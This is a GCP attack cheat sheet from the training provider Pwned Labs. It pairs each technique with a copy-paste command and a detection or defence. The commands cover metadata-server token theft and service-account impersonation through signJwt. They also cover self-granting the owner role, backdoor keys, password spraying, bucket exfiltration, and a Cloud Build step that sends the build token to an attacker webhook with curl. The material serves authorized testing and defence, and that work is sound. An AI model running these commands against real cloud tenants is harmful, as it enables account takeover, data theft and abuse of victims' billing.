# GCP Cloud Attack Cheat Sheet

A phase-by-phase offensive security reference for GCP, with a real command for every technique. Maintained by [Pwned Labs](https://pwnedlabs.io), which teaches these attacks and their defenses hands-on in live GCP environments through Academy labs and the Google Cloud Attack and Defense bootcamp (GCRTP).

The full interactive version, with one-click copy for every command, is at **[https://pwnedlabs.io/resources/gcp-cloud-attack-cheat-sheet](https://pwnedlabs.io/resources/gcp-cloud-attack-cheat-sheet)**.

---

## How to Use This Cheat Sheet

The sections follow the order a Google Cloud attack path usually takes, from the first foothold to impact, then the controls that break each step. Every row gives the technique, a real command you can copy, what the access yields, and the detection or control that interrupts it. Everything here is for authorized testing and defensive work.

Three building blocks recur throughout: **projects** (the resource and billing boundary), **service accounts** (the non-human identities that workloads run as), and **short-lived OAuth 2.0 access tokens** (how those identities call APIs). Most escalation and movement in GCP comes down to obtaining a token for a more privileged service account. Commands use placeholders such as `PROJECT_ID`, `SA_EMAIL` and `TARGET_SA` that you replace with real values.

## Enumeration and Situational Awareness

After any foothold, the first job is to learn what identity you hold and what it can reach. GCP permissions are fine grained, so the fastest win is to ask the APIs directly which permissions the current token actually has.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Set a stolen token for gcloud | `gcloud config set auth/access_token_file token.txt` | Runs gcloud as whoever the captured OAuth token belongs to. | Token use shows in Cloud Audit Logs under the stolen principal. |
| List accessible projects | `gcloud projects list` | The projects the token can see and their numbers. | resourcemanager.projects.list calls in Admin Activity logs. |
| Read a project IAM policy | `gcloud projects get-iam-policy PROJECT_ID` | Every principal, role and custom role in the project. | A service account calling getIamPolicy is a strong anomaly. |
| List service accounts | `gcloud iam service-accounts list --project=PROJECT_ID` | The non-human identities to target or impersonate. | Least privilege: do not grant SA list rights broadly. |
| Test your own permissions on a resource | `curl -s -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" -H "Content-Type: application/json" -d '{"permissions":["run.services.get","run.services.getIamPolicy"]}' "https://run.googleapis.com/v1/projects/PROJECT_ID/locations/us-central1/services/SERVICE:testIamPermissions"` | Exactly which actions you hold, even when reading the policy is denied. | High volume of testIamPermissions calls from one principal. |
| Discover testable permissions | `curl -s -X POST -H "Authorization: Bearer $(gcloud auth print-access-token)" -H "Content-Type: application/json" -d '{"fullResourceName":"//cloudresourcemanager.googleapis.com/projects/PROJECT_ID"}' "https://iam.googleapis.com/v1/permissions:queryTestablePermissions"` | The full permission set to check against a resource. | Pair with testIamPermissions to find hidden grants. |
| Brute-force permissions from a token ([gcp-permissions-checker](https://github.com/egre55/gcp-permissions-checker)) | `python3 gcp_perm_checker.py -Token="$(gcloud auth print-access-token)" -ProjectID="PROJECT_ID"` | The permissions a token holds when you cannot read the IAM policy. | Bursts of permission probes stand out in audit logs. |
| Audit the whole project ([ScoutSuite](https://github.com/nccgroup/ScoutSuite)) | `python3 scout.py gcp --service-account KEY.json` | Public resources, weak IAM and attack paths in one report. | Run it yourself to fix findings before an attacker uses them. |
| Audit against CIS ([Prowler](https://github.com/prowler-cloud/prowler)) | `prowler gcp --project-id PROJECT_ID` | Misconfigurations mapped to CIS and other benchmarks. | Schedule it; feed findings to Security Command Center. |
| Shell-based GCP audit ([Hayat](https://github.com/DenizParlak/Hayat)) | `./hayat.sh` | A quick scripted read of IAM, storage, compute and logging. | Same checks a defender can run on a cadence. |

The testIamPermissions and queryTestablePermissions pattern matters because a principal can often act on a resource without being allowed to read the policy, so asking "what can I do here" beats trying to read bindings you cannot see. Pwned Labs builds this permission-fuzzing workflow hands-on in its [Illuminate GCP by Fuzzing IAM Permissions](https://pwnedlabs.io/explore/illuminate-gcp-by-fuzzing-iam-permissions) lab.

## Initial Access

Initial access into Google Cloud rarely starts with a GCP API. It usually starts with an identity or a leaked credential: a Workspace account, a service account key left in a repository, a public bucket, or a web application that can reach the metadata server.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Generate a username list ([username-anarchy](https://github.com/urbanadventurer/username-anarchy)) | `./username-anarchy --suffix @TARGET.com First Last >> usernames.txt` | Candidate Workspace addresses from a full name. | Not visible to the target; controls come at login. |
| Validate Workspace addresses (SMTP RCPT TO) | `swaks --to user@TARGET.com --server aspmx.l.google.com --quit-after RCPT` | A 250 reply confirms a live Google-hosted mailbox. | Hard to detect; reduce exposure of valid address formats. |
| Low-and-slow password spray ([SprayShark](https://github.com/helviojunior/sprayshark)) | `sprayshark spray -u user@TARGET.com -P passwords.txt` | A valid Google credential, sometimes into GCP. | Enforce MFA and watch for distributed failed logins. |
| Authenticate with a leaked key file | `gcloud auth activate-service-account --key-file=KEY.json` | Direct authentication as that service account. | iam.disableServiceAccountKeyCreation; scan repos for keys. |
| List a public bucket | `gcloud storage ls gs://BUCKET` | Readable objects, often backups, configs or secrets. | storage.publicAccessPrevention; uniform bucket-level access. |
| Find buckets by keyword ([GCPBucketBrute](https://github.com/RhinoSecurityLabs/GCPBucketBrute)) | `python3 gcpbucketbrute.py -k COMPANY -u` | Unlisted and misconfigured buckets tied to a keyword. | Avoid predictable bucket names; block anonymous reads. |
| Reach metadata through SSRF | `curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"` | The attached service account token from a vulnerable app. | Require the metadata header; use GKE metadata concealment. |

Two free Pwned Labs labs cover the most common of these: [Exploit SSRF with Gopher for GCP Initial Access](https://pwnedlabs.io/explore/exploit-ssrf-with-gopher-for-gcp-initial-access) reaches the metadata server from a vulnerable app, and [Reveal Hidden Files in Google Storage](https://pwnedlabs.io/explore/reveal-hidden-files-in-google-storage) works a misconfigured Cloud Storage bucket.

## Credential Access and Token Theft

On a Compute Engine instance, Cloud Run service or Cloud Build worker, the attached service account is reachable through the metadata server, which returns a short-lived OAuth token with no password. Secret stores and configuration are the other rich sources.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| List attached service accounts | `curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/" -H "Metadata-Flavor: Google"` | The identities the workload can request tokens for. | Any metadata hit from app code is worth alerting on. |
| Request the metadata token | `curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/SA_EMAIL/token" -H "Metadata-Flavor: Google"` | An OAuth token for the attached service account. | Scope SAs tightly; a stolen token inherits every binding. |
| Print the active identity token | `gcloud auth print-access-token` | A usable bearer token for the current principal. | Prefer short-lived credentials over downloaded keys. |
| Read a secret from Secret Manager | `gcloud secrets versions access latest --secret=NAME --project=PROJECT_ID` | Stored secrets, API keys and credentials. | Alert on secretmanager.versions.access from new principals. |
| Render a Parameter Manager value | `curl -H "Authorization: Bearer $(gcloud auth print-access-token)" "https://parametermanager.googleapis.com/v1/projects/PROJECT_ID/locations/global/parameters/NAME/versions/VERSION:render"` | Rendered configuration, sometimes with embedded keys. | Keep credentials out of parameters; watch render calls. |
| Read Cloud Run env vars | `gcloud run services describe SERVICE --region=us-central1` | Admin credentials shipped as service environment variables. | Move secrets to Secret Manager; SCC flags env-var secrets. |
| Dump VM and startup-script metadata | `gcloud compute instances describe NAME --zone=ZONE --format=json` | Secrets baked into instance metadata or startup scripts. | Never store secrets in metadata; review startup scripts. |

The metadata server is the hinge of most GCP intrusions, so treating any code-execution or SSRF bug on a cloud workload as a token-theft primitive is the right instinct.

## Privilege Escalation

Escalation in GCP is usually a chain of service account impersonation. A permission on one account lets you request a token for a more privileged account, and custom roles often grant exactly the narrow permission that makes the next hop possible.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Direct impersonation (`iam.serviceAccounts.getAccessToken`) | `gcloud auth print-access-token --impersonate-service-account=TARGET_SA` | An access token for the target service account. | Alert on GenerateAccessToken for sensitive accounts. |
| Sign a JWT as the target (`iam.serviceAccounts.signJwt`) | `curl -s -H "Authorization: Bearer $(gcloud auth print-access-token)" -H "Content-Type: application/json" -X POST -d '{"payload":"{\"iss\":\"TARGET_SA\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"aud\":\"https://oauth2.googleapis.com/token\",\"iat\":1700000000,\"exp\":1700003600}"}' "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/TARGET_SA:signJwt"` | A signed JWT you exchange for the target account token. | signJwt on a service account is rarely legitimate; alert. |
| Exchange the signed JWT for a token | `curl -s -d "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer" -d "assertion=$SIGNED_JWT" https://oauth2.googleapis.com/token` | A full OAuth token for the target service account. | Watch jwt-bearer grants paired with prior signJwt. |
| Create a long-lived key (`iam.serviceAccountKeys.create`) | `gcloud iam service-accounts keys create key.json --iam-account=TARGET_SA` | A durable key for a service account you can read. | iam.disableServiceAccountKeyCreation stops this outright. |
| Act as a service account (`iam.serviceAccounts.actAs`) | `gcloud functions deploy loot --runtime=python312 --trigger-http --service-account=TARGET_SA --allow-unauthenticated` | Code that runs as a more privileged account. | Audit actAs grants; restrict who can deploy. |
| Grant yourself a role (`*.setIamPolicy`) | `gcloud projects add-iam-policy-binding PROJECT_ID --member="serviceAccount:SA_EMAIL" --role="roles/owner"` | A new binding that makes you project owner. | constraints/iam.allowedPolicyMemberDomains; alert on owner grants. |
| Map known escalation paths ([GCP-IAM-Privilege-Escalation](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation)) | `python3 check_for_privesc.py` | A flag on dangerous permissions already present. | Run the same scanner to find and remove the paths. |

The delegation case is worth calling out: a principal does not always need getAccessToken directly on the final target if it can reach it through an account that does, so mapping who can impersonate whom matters more than any single binding. Pwned Labs runs these paths as standalone labs, including [Impersonate GCP Service Account for Privileged Access](https://pwnedlabs.io/explore/impersonate-gcp-service-account-for-privileged-access) and [Escalate GCP Privileges with Implicit Delegation](https://pwnedlabs.io/explore/escalate-gcp-privileges-with-implicit-delegation).

## Lateral Movement

Lateral movement in GCP crosses services and projects rather than hosts. A token or key from one workload frequently opens an unrelated service, and shared service accounts tie projects together.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Hijack a Cloud Build pipeline | `# add to cloudbuild.yaml, then push - name: ubuntu entrypoint: bash args: ["-c", "curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \| curl -X POST -d @- $WEBHOOK"]` | The build service account token, sent to your webhook. | Protect build configs; review cloudbuild.yaml diffs. |
| Pivot from Compute Engine to storage | `gcloud compute instances describe NAME --zone=ZONE --format="value(metadata)"` | Startup-script secrets and HMAC keys, then bucket access. | Keep secrets out of metadata; least-privilege the VM SA. |
| Enumerate across projects a token reaches | `for P in $(gcloud projects list --format="value(projectId)"); do gcloud storage ls --project=$P; done` | Resources in other projects the account is bound to. | Separate projects; avoid shared cross-project SAs. |
| Workspace to GCP ([google-workspace-enum](https://github.com/pwnedlabs/google-workspace-enum)) | `python3 gws-enum.py` | Drive, Gmail and shared-drive data, and linked GCP projects. | Review OAuth app grants; restrict third-party access. |

Cloud Build is a frequent pivot because the build worker runs as a service account and executes whatever the pipeline defines, so an attacker who can change a build config can read that account token. Pwned Labs walks the full build-token path in its [Exploiting GCP Cloud Build for Privilege Escalation](https://pwnedlabs.io/blog/exploiting-gcp-cloud-build-for-privilege-escalation) write-up.

## Persistence

Persistence in Google Cloud means keeping a usable identity after the original foothold is closed. Service account keys and IAM bindings are the quiet, durable options.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Create a service account key | `gcloud iam service-accounts keys create bd.json --iam-account=TARGET_SA` | A key that works until it is found and revoked. | iam.disableServiceAccountKeyCreation; rotate and audit keys. |
| Add a durable IAM binding | `gcloud projects add-iam-policy-binding PROJECT_ID --member="serviceAccount:ATTACKER_SA" --role="roles/editor"` | Access that survives password resets and token expiry. | Alert on setIamPolicy; review bindings regularly. |
| Create a quiet service account | `gcloud iam service-accounts create helper --display-name="helper"` | An attacker-owned identity hidden in a busy project. | Track SA creation; name and tag legitimate accounts. |
| Re-trigger access from a workload | `gcloud functions deploy beacon --runtime=python312 --trigger-http --service-account=TARGET_SA --allow-unauthenticated` | A function or revision that re-establishes access on run. | Review deployed functions, revisions and startup scripts. |

Workspace OAuth grants and domain-wide delegation are a separate durable route: an app grant can read user data without a password, and domain-wide delegation widens that reach across the tenant.

## Impact

Impact is where an attacker shows what the access is worth: reading the data a stolen identity can reach, or spending the account resources.

| Technique | Command | What it gives you | Detection and defense |
| --- | --- | --- | --- |
| Exfiltrate a bucket | `gcloud storage cp -r gs://BUCKET ./loot` | Objects, backups and secrets from Cloud Storage. | VPC Service Controls; alert on large egress reads. |
| Query BigQuery data | `bq query --use_legacy_sql=false "SELECT * FROM DATASET.TABLE LIMIT 1000"` | Tables of customer or financial data. | Column-level access; audit large result exports. |
| Pull a secret value | `gcloud secrets versions access latest --secret=NAME --project=PROJECT_ID` | Downstream credentials to extend the breach. | Alert on secret access from unusual principals. |
| Spin up resources on the victim bill | `gcloud compute instances create miner --machine-type=n2-standard-16 --zone=ZONE` | Compute for cryptomining on the victim billing account. | Quota and budget alerts; constrain instance creation. |

## Detection and Defense

The same mechanisms that enable each phase point to the controls that break it. Organization Policy constraints remove whole classes of attack, Cloud Audit Logs make the rest visible, and least privilege shrinks what any single stolen token can do.

### Preventive Organization Policy constraints

| Constraint | Command | What it prevents |
| --- | --- | --- |
| `iam.disableServiceAccountKeyCreation` | `gcloud resource-manager org-policies enable-enforce iam.disableServiceAccountKeyCreation --organization=ORG_ID` | New long-lived keys, the most common persistence vector. |
| `iam.automaticIamGrantsForDefaultServiceAccounts` | `gcloud resource-manager org-policies enable-enforce iam.automaticIamGrantsForDefaultServiceAccounts --organization=ORG_ID` | Default service accounts getting the broad Editor role. |
| `storage.publicAccessPrevention` | `gcloud resource-manager org-policies enable-enforce storage.publicAccessPrevention --organization=ORG_ID` | Buckets exposed to allUsers or allAuthenticatedUsers. |
| `compute.vmExternalIpAccess` | `gcloud resource-manager org-policies deny compute.vmExternalIpAccess --all --organization=ORG_ID` | Instances getting public IPs that widen the attack surface. |

### Detection queries and tools

| Technique | Command | What it catches | Notes |
| --- | --- | --- | --- |
| Hunt token generation (Logs Explorer) | `protoPayload.methodName="GenerateAccessToken"` | Impersonation and rapid, short-interval token minting. | A strong privilege-escalation signal. |
| Hunt signJwt use | `protoPayload.methodName="SignJwt"` | JWT signing used to chain to higher-privileged accounts. | Rarely legitimate from most service accounts. |
| Hunt a service account reading IAM policy | `protoPayload.methodName="getIamPolicy" AND protoPayload.authenticationInfo.principalEmail="SA_EMAIL"` | Recon that service accounts should not perform. | Flag non-human principals calling getIamPolicy. |
| List Security Command Center findings | `gcloud scc findings list ORG_ID --filter="state=\"ACTIVE\""` | Public buckets, env-var secrets and over-privileged accounts. | Native, organization-wide posture management. |
| Run a posture scan (Prowler) | `prowler gcp --project-id PROJECT_ID` | The same misconfigurations an attacker would find. | Fix findings before they are used. |

Pwned Labs teaches the defensive side of this cheat sheet with the same tools, covering Security Command Center reviews, Logs Explorer threat hunting and Prowler assessments in the Google Cloud Attack and Defense bootcamp that leads to the GCRTP certification.

## Tools Referenced in This Cheat Sheet

| Tool | Phase | Repository |
| --- | --- | --- |
| `gcloud` CLI | All phases | [cloud.google.com/sdk/gcloud](https://cloud.google.com/sdk/gcloud) |
| gcp-permissions-checker | Enumeration | [egre55/gcp-permissions-checker](https://github.com/egre55/gcp-permissions-checker) |
| ScoutSuite | Enumeration, defense | [nccgroup/ScoutSuite](https://github.com/nccgroup/ScoutSuite) |
| Prowler | Enumeration, defense | [prowler-cloud/prowler](https://github.com/prowler-cloud/prowler) |
| Hayat | Enumeration, defense | [DenizParlak/Hayat](https://github.com/DenizParlak/Hayat) |
| username-anarchy | Initial access | [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy) |
| SprayShark | Initial access | [helviojunior/sprayshark](https://github.com/helviojunior/sprayshark) |
| GCPBucketBrute | Initial access | [RhinoSecurityLabs/GCPBucketBrute](https://github.com/RhinoSecurityLabs/GCPBucketBrute) |
| GCP-IAM-Privilege-Escalation | Privilege escalation | [RhinoSecurityLabs/GCP-IAM-Privilege-Escalation](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation) |
| google-workspace-enum | Lateral movement | [pwnedlabs/google-workspace-enum](https://github.com/pwnedlabs/google-workspace-enum) |
| Security Command Center | Defense | [cloud.google.com/security-command-center](https://cloud.google.com/security-command-center) |

## Practice this at Pwned Labs

The fastest way from this cheat sheet to real skill is the **[Google Cloud Attack and Defense bootcamp](https://pwnedlabs.io/bootcamps/gcrtp-bootcamp)**, which runs every phase above against live GCP projects and certifies the skill with the GCRTP exam. The free labs below are the way in.

Pwned Labs runs these Google Cloud attack paths as hands-on labs in live GCP projects. The first two below are free.

- **[Reveal Hidden Files in Google Storage](https://pwnedlabs.io/explore/reveal-hidden-files-in-google-storage)** (Free, Beginner): enumerate and pull objects from a misconfigured Cloud Storage bucket, the classic GCS initial-access step.
- **[Exploit SSRF with Gopher for GCP Initial Access](https://pwnedlabs.io/explore/exploit-ssrf-with-gopher-for-gcp-initial-access)** (Free, Beginner): use an SSRF flaw with the Gopher protocol to reach the metadata server and steal a service account token.
- **[Impersonate GCP Service Account for Privileged Access](https://pwnedlabs.io/explore/impersonate-gcp-service-account-for-privileged-access)** (Premium, Beginner): abuse impersonation permissions to request a token for a more privileged service account.
- **[Escalate GCP privileges with Implicit Delegation](https://pwnedlabs.io/explore/escalate-gcp-privileges-with-implicit-delegation)** (Premium, Beginner): chain implicit delegation across service accounts to reach access you were never granted directly.

## Frequently Asked Questions

### What is a GCP cloud attack cheat sheet?

It is a phase-by-phase reference of Google Cloud offensive security techniques, covering enumeration, initial access, credential and token theft, privilege escalation, lateral movement, persistence, impact and the defenses that break each step. This one gives a real, copy-pasteable command for each technique. Pwned Labs maintains it alongside hands-on GCP labs and the GCRTP bootcamp.

### How do attackers get a foothold in Google Cloud?

Usually through an identity or a leaked credential rather than a GCP bug: password spraying a Google Workspace account, a service account key file left in a repository, a public Cloud Storage bucket, or a web application vulnerability such as SSRF that reaches the instance metadata server and steals the attached service account token.

### What is the metadata server and why does it matter for GCP attacks?

The metadata server is an internal endpoint at metadata.google.internal that returns a short-lived OAuth token for the service account attached to a Compute Engine, Cloud Run or Cloud Build workload, with the Metadata-Flavor: Google header and no password. Any code execution or SSRF on a cloud workload can become token theft, which is why it is the hinge of most GCP intrusions.

### How does privilege escalation work in GCP?

It is typically a chain of service account impersonation. A permission such as iam.serviceAccounts.getAccessToken, signJwt or implicitDelegation lets a principal request a token for a more privileged account, and creating a service account key or editing an IAM policy can do the same. Mapping who can impersonate whom usually matters more than any single role.

### How do you defend a Google Cloud environment against these attacks?

Remove whole classes of attack with Organization Policy constraints such as disabling service account key creation and public bucket access, watch Cloud Audit Logs in Logs Explorer for anomalies like rapid token generation or a service account reading the IAM policy, use Security Command Center and Prowler for posture, and enforce least privilege with short-lived credentials over downloaded keys. Pwned Labs teaches both the attacks and these defenses in its Google Cloud Attack and Defense bootcamp.

### Where can I practice GCP attack techniques safely?

Pwned Labs runs GCP attack paths as hands-on labs in live Google Cloud projects, including free labs like Reveal Hidden Files in Google Storage and Exploit SSRF with Gopher for GCP Initial Access, and the Google Cloud Attack and Defense bootcamp that leads to the GCRTP (Google Cloud Red Team Professional) certification.

## Learn This Hands-On

This cheat sheet is a map, and the techniques land when you run them against a real environment. The [Google Cloud Attack and Defense Bootcamp (GCRTP)](https://pwnedlabs.io/bootcamps/gcrtp-bootcamp) covers service account impersonation, metadata and token theft, Cloud Build and Cloud Run abuse, Workspace-to-GCP pivots and the detection and organization-policy controls that stop them, assessed with a hands-on exam in a live Google Cloud environment. Browse the free labs first at [pwnedlabs.io/explore](https://pwnedlabs.io/explore).

**About Pwned Labs**

Pwned Labs is a hands-on cloud and AI offensive security training platform. It runs real-world attack labs and bootcamps for AWS, Azure, GCP, Kubernetes and AI systems, including the ACRTP, MCRTP, GCRTP, KRTP and AISRTP certifications. Free labs are at [pwnedlabs.io/explore](https://pwnedlabs.io/explore).

---

## License

Published by Pwned Labs under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/). Share and adapt with attribution to Pwned Labs (https://pwnedlabs.io).
